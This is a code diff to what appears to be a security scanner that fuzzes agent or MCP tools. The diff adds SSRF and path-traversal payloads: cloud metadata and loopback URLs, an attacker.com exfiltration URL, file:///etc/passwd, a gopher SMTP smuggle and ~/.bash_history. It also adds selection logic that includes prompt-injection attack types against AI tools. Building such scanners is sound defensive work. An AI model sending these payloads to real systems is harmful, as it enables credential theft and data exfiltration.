@@ -203,6 +203,80 @@ class StaticPayloadGenerator:
                 risk_level="medium",
                 category="high"
             ),
+            
+            # HTTP/SSRF specific attacks
+            StaticPayloadResult(
+                payload={"input": "http://localhost:8080"},
+                attack_type="ssrf",
+                technique="internal_service_access",
+                expected_behavior="internal_network_access",
+                risk_level="high",
+                category="critical"
+            ),
+            StaticPayloadResult(
+                payload={"input": "http://127.0.0.1:3000"},
+                attack_type="ssrf",
+                technique="loopback_access",
+                expected_behavior="local_service_access",
+                risk_level="high",
+                category="critical"
+            ),
+            StaticPayloadResult(
+                payload={"input": "http://169.254.169.254/latest/meta-data/"},
+                attack_type="ssrf",
+                technique="cloud_metadata_access",
+                expected_behavior="cloud_metadata_exposure",
+                risk_level="critical",
+                category="critical"
+            ),
+            StaticPayloadResult(
+                payload={"input": "http://demo.testfire.net"},
+                attack_type="ssrf",
+                technique="external_service_access",
+                expected_behavior="external_network_access",
+                risk_level="medium",
+                category="high"
+            ),
+            StaticPayloadResult(
+                payload={"input": "http://attacker.com/steal"},
+                attack_type="ssrf",
+                technique="malicious_external_access",
+                expected_behavior="data_exfiltration",
+                risk_level="critical",
+                category="critical"
+            ),
+            StaticPayloadResult(
+                payload={"input": "file:///etc/passwd"},
+                attack_type="ssrf",
+                technique="file_protocol_abuse",
+                expected_behavior="file_system_access",
+                risk_level="high",
+                category="critical"
+            ),
+            StaticPayloadResult(
+                payload={"input": "ftp://internal-server.com"},
+                attack_type="ssrf",
+                technique="ftp_protocol_abuse",
+                expected_behavior="ftp_service_access",
+                risk_level="medium",
+                category="high"
+            ),
+            StaticPayloadResult(
+                payload={"input": "gopher://internal-server.com:25/_HELO%20localhost"},
+                attack_type="ssrf",
+                technique="gopher_protocol_abuse",
+                expected_behavior="smtp_service_access",
+                risk_level="high",
+                category="critical"
+            ),
+            StaticPayloadResult(
+                payload={"input": "~/.bash_history"},
+                attack_type="path_traversal",
+                technique="user_file_access",
+                expected_behavior="user_data_exposure",
+                risk_level="medium",
+                category="high"
+            ),
             StaticPayloadResult(
                 payload={"input": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"},
                 attack_type="path_traversal",
@@ -353,28 +427,65 @@ class StaticPayloadGenerator:
         
         return base_payloads
     
-    def generate_payloads(self, tool_name: str, tool_desc: str, input_schema: Dict) -> List[StaticPayloadResult]:
+    def generate_payloads(self, tool_name: str, tool_desc: str, input_schema: Dict, include_prompt: bool = False) -> List[StaticPayloadResult]:
         """Generate static payloads based on tool type"""
         
         # Classify the tool to select relevant payloads
         tool_type = self._classify_tool(tool_name, tool_desc)
+        logger.debug(f"Tool {tool_name} classified as: {tool_type}")
         
         # Filter payloads based on tool type and relevance
         relevant_payloads = []
-        
-        for payload in self.payloads:
-            # Always include critical payloads
-            if payload.category == "critical":
-                relevant_payloads.append(payload)
-            # Include high-risk payloads for most tools
-            elif payload.category == "high":
-                relevant_payloads.append(payload)
-            # Include medium-risk payloads for boundary testing
-            elif payload.category == "medium" and payload.attack_type == "boundary_testing":
-                relevant_payloads.append(payload)
-            # Include tool-specific payloads
-            elif payload.attack_type == tool_type:
-                relevant_payloads.append(payload)
+
+        prompt_like_types = {
+            "context_manipulation",
+            "role_confusion",
+            "instruction_injection",
+            "delimiter_attack",
+            "encoding_attack",
+            "progressive_escalation",
+            "social_engineering",
+        }
+
+        # If schema clearly expects a URL, force-select only HTTP/SSRF/API payloads
+        props = (input_schema or {}).get('properties') or {}
+        has_url_param = isinstance(props, dict) and 'url' in props
+        if has_url_param:
+            for payload in self.payloads:
+                if not include_prompt and payload.attack_type in prompt_like_types:
+                    continue
+                if payload.attack_type in {"ssrf", "api_manipulation", "boundary_testing"}:
+                    relevant_payloads.append(payload)
+            logger.debug(f"URL schema detected for {tool_name}; selected {len(relevant_payloads)} HTTP/SSRF payloads")
+        else:
+            for payload in self.payloads:
+                # Skip prompt-injection style payloads unless explicitly requested
+                if not include_prompt and payload.attack_type in prompt_like_types:
+                    continue
+
+                if tool_type == "api_manipulation":
+                    # STRICT: Only HTTP/SSRF/API payloads (plus boundary testing)
+                    allowed_types = {"ssrf", "api_manipulation", "boundary_testing"}
+                    if payload.attack_type not in allowed_types:
+                        continue
+                    relevant_payloads.append(payload)
+                    if payload.attack_type == "ssrf":
+                        logger.debug(f"Added SSRF payload for {tool_name}: {payload.payload}")
+                    continue
+
+                # Default behavior for non-HTTP tools
+                # Always include critical payloads
+                if payload.category == "critical":
+                    relevant_payloads.append(payload)
+                # Include high-risk payloads for most tools
+                elif payload.category == "high":
+                    relevant_payloads.append(payload)
+                # Include medium-risk payloads for boundary testing
+                elif payload.category == "medium" and payload.attack_type == "boundary_testing":
+                    relevant_payloads.append(payload)
+                # Include tool-specific payloads
+                elif payload.attack_type == tool_type:
+                    relevant_payloads.append(payload)
         
         # Limit to reasonable number for performance
         max_payloads = 30
@@ -431,7 +542,43 @@ class StaticPayloadGenerator:
         
         # Create adapted payload based on tool parameters
         adapted_payload = {}
-        
+
+        # Special-case mapping for common HTTP tools or schemas with 'url'
+        props = (input_schema or {}).get('properties') or {}
+        lower_tool = tool_name.lower()
+        has_url_param = isinstance(props, dict) and 'url' in props
+        if has_url_param or lower_tool in ("curl_request", "http_request", "fetch", "http_call"):
+            # Minimal, type-correct HTTP payload
+            adapted_payload = {}
+            # URL is required focus
+            adapted_payload['url'] = payload_value
+            # Respect schema if method present
+            if 'method' in props:
+                adapted_payload['method'] = 'GET'
+            # Only include other fields if required by schema with sane defaults
+            required = set((input_schema or {}).get('required') or [])
+            for name, spec in (props or {}).items():
+                if name in ('url', 'method'):
+                    continue
+                if name in required:
+                    typ = (spec or {}).get('type')
+                    if typ == 'boolean':
+                        adapted_payload[name] = False
+                    elif typ in ('object', 'array'):
+                        adapted_payload[name] = {} if typ == 'object' else []
+                    elif typ in ('number', 'integer'):
+                        adapted_payload[name] = 0
+                    else:
+                        adapted_payload[name] = ""
+            return StaticPayloadResult(
+                payload=adapted_payload,
+                attack_type=payload.attack_type,
+                technique=payload.technique,
+                expected_behavior=payload.expected_behavior,
+                risk_level=payload.risk_level,
+                category=payload.category
+            )
+
         if len(param_names) == 1:
             # Single parameter - use the first parameter name
             adapted_payload[param_names[0]] = payload_value
@@ -450,6 +597,8 @@ class StaticPayloadGenerator:
             adapted_payload[param_names[0]] = payload_value
             for param_name in param_names[1:]:
                 adapted_payload[param_name] = ""
+
+        # (HTTP special-case handled above)
         
         # Create new StaticPayloadResult with adapted payload
         return StaticPayloadResult(
